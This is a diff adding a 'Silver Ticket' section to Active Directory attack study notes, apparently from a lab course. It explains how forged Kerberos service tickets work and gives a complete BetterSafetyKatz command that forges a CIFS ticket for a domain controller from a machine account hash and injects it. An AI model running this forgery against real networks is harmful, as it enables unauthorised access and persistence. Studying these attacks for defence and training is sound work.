@@ -1,3 +1,19 @@
+### Silver Ticket
+- Encrypted and Signed by the hash of the service account of the service running with that account.
+- Services rarely check PAC (Privileged Attribute Certificate).
+- Services will allow access only to the services themselves.
+- Reasonable persistence period (default 30 days for computer accounts).
+
+#### Attack
+- Using hash of the Domain Controller computer account, below command provides access to file system on the DC.
+```powershell
+BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+```
+• Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, HTTP and many more
+
+![[Pasted image 20231215170859.png]]
+
+
 
 ---
 ### Golden Ticket
